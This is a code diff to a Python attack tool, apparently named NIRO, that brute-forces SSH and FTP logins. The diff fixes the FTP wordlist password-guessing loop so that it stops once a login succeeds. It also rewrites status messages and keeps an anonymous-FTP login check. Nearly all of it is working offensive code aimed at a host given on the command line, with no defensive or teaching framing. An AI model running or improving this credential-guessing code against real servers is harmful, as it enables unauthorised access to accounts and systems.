@@ -160,7 +160,9 @@ if probe_port(sys.argv[1],22) == 0:  #verification is port 22 open and then cont
         else :
            print(Fore.RED+"[-] INVALID FILE .")
 else:
-        print(Fore.RED+"(-_-) PORT 22 CLOSED...")
+    print(Fore.RED+"----------------------------")
+    print("[!] 22/TCP SSH ---> CLOSED")
+    print("----------------------------")
 
 print(Fore.RED+"---------------END OF SSH BruteForce-----------------")
 
@@ -168,10 +170,13 @@ print(Fore.CYAN+"===========================================================")
 print(Fore.WHITE+"[*-*] Starting NIRO in FTP Brute force mode ...")
 print(Fore.CYAN+"===========================================================")
 
+def fin():
+ print(Fore.RED+"----------------END OF FTP BruteForce---------------------")
+ sys.exit(0)
 
 def anonymous(ip):
     try :
-        ftp= FTP(ip)
+        ftp= ftplib.FTP(ip)
         ftp.login()
         print(Fore.GREEN+"-----------------------------")
         print("[+] ANONYMOUS LOGIN is OPEN")
@@ -181,28 +186,28 @@ def anonymous(ip):
       pass    
 
 def ftp_login(ip,username_ftp,passwd):
-    try:
-        ftp = FTP(ip)
-        ftp.login(username_ftp, passwd)
-        ftp.quit()
-        print(Fore.GREEN+"[!] ACCOUNT FOUND : [FTP] Host : "+sys.argv[1]+" Login : "+username_ftp+"/"+word+"[SUCCESS]")
-        break
-    except:
-        pass
-
+ 
+        ftp = ftplib.FTP(ip)
+        try:
+         ftp.login(username_ftp, passwd)
+        except ftplib.error_perm:
+         return False
+        else:
+         print(Fore.GREEN+"[!] ACCOUNT FOUND : [FTP] Host : "+sys.argv[1]+" Login : "+username_ftp+"/"+passwd+"[SUCCESS]")
+         return True
 
 def brute_force(ip, username_ftp, wordlists):
     try:
         ftp_list = open(wordlists).read()
         words = ftp_list.splitlines()
         for word in words:
-            word = word.strip()
+            #word = word.strip()
             print(Fore.YELLOW+"[!] ACCOUNT CHECK : [FTP] Host : "+sys.argv[1]+" Login : "+username_ftp+"/"+word)
-            ftp_login(ip, username_ftp, word)
-
+            if (ftp_login(ip, username_ftp, word) == True):
+               break
     except:
         print(Fore.RED+"[-] There is no such wordlist file.")
-        exit(0)
+        fin()
 
 #Main program
 if probe_port(sys.argv[1],21) == 0:  #verification est ce que le port 21 est ouvert
@@ -211,7 +216,7 @@ if probe_port(sys.argv[1],21) == 0:  #verification est ce que le port 21 est ouv
    print("----------------------------")
    username_ftp = str(input(Fore.BLUE+"Enter a spesific useranme : "+Fore.WHITE))
    wordlists = str(input(Fore.BLUE+"Enter FTP list File location : "+Fore.WHITE)) 
-   brute_force(sys.argv[1],username_ftp,wordlists)
+   brute_force(str(sys.argv[1]),username_ftp,wordlists)
    veri = input(Fore.MAGENTA+"DO YOU WANT TO CHECK ANONYMOUS ACCOUNT [Y/n] : "+Fore.WHITE)
    if(veri == 'y' or veri == 'Y' ):
       anonymous(sys.argv[1])
